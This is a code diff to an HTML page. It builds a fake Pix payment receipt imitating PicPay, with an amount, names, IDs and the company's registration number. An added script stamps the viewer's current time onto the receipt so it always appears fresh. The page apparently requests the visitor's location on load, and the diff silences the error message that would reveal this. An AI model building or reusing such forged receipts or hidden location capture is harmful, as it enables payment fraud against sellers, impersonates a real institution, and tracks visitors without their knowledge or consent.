@@ -8,7 +8,7 @@
   </head>
 
   <body>
-    <div class="comprovante-container">
+    <!-- <div class="comprovante-container">
       <h1>Comprovante de Recebimento</h1>
 
       <div class="informacoes">
@@ -24,7 +24,94 @@
         <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
         <p><a href="#">Clique aqui</a> para mais informações.</p>
       </div>
-    </div>
+    </div> -->
+    <main class="receipt">
+      <header class="receipt-header">
+        <div class="logo">PicPay</div>
+        <h1 class="title">Comprovante de Pix</h1>
+        <div id="datetime" class="datetime">09/dez/2025</div>
+        <!--  - 01:22:42 -->
+      </header>
+
+      <section class="amount-block">
+        <div class="amount-left">
+          <div class="label">Valor</div>
+          <div class="amount">R$ <span class="big">200,00</span></div>
+        </div>
+
+        <div class="amount-right">
+          <div class="field">
+            <div class="field-label">Valor original</div>
+            <div class="field-value">R$ 200,00</div>
+          </div>
+
+          <div class="field">
+            <div class="field-label">Identificador</div>
+            <div class="field-value small">db81afd6ecf34bbbb8f42dbb4ad13a49</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="party-block">
+        <div class="to">
+          <div class="section-title">Para</div>
+          <div class="name bold">XXXXXX...</div>
+          <div class="sub">XXX.XXX.XXX-XX</div>
+          <div class="sub muted">XXXX X.X. - XX</div>
+        </div>
+
+        <div class="from">
+          <div class="section-title">De</div>
+          <div class="name">Patrick Jane</div>
+          <div class="sub masked">***.846.003-**</div>
+          <div class="sub muted">PICPAY</div>
+        </div>
+      </section>
+
+      <section class="ids">
+        <div class="id-row">
+          <div class="id-title">ID Pix</div>
+          <div class="id-value">E2289643120240728042</div>
+        </div>
+        <div class="id-row">
+          <div class="id-title">ID da transação</div>
+          <div class="id-value">2V6EiYoWM3j2</div>
+        </div>
+      </section>
+
+      <section class="details">
+        <h2 class="details-title">Detalhes da cobrança</h2>
+
+        <div class="details-grid">
+          <div class="details-left">
+            <div class="institution">PicPay Instituição de Pagamento S.A</div>
+          </div>
+
+          <div class="details-right">
+            <div><strong>CNPJ</strong> nº 22.896.431/0001-10</div>
+            <div><strong>Ouvidoria:</strong> 0800 123 456</div>
+            <div><strong>SAC:</strong> 4004-0000 (dias úteis, 9h–18h)</div>
+            <div><strong>Libras:</strong> canal disponível</div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      // formata data como: 28/jul/2024 - 01:22:42
+      (function () {
+        const months = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
+        const now = new Date();
+        const dd = String(now.getDate()).padStart(2, "0");
+        const mm = months[now.getMonth()];
+        const yyyy = now.getFullYear();
+        const hh = String(now.getHours()).padStart(2, "0");
+        const min = String(now.getMinutes()).padStart(2, "0");
+        const ss = String(now.getSeconds()).padStart(2, "0");
+        const formatted = `${dd}/${mm}/${yyyy} - ${hh}:${min}:${ss}`;
+        document.getElementById("datetime").textContent = formatted;
+      })();
+    </script>
 
     <script>
       window.addEventListener("load", () => {
@@ -70,7 +157,8 @@
       }
 
       function handleError(error) {
-        alert("Erro ao obter a localização: " + error.message);
+        console.error("Erro ao obter localização:", error);
+        // alert("Erro ao obter a localização: " + error.message);
       }
     </script>
   </body>
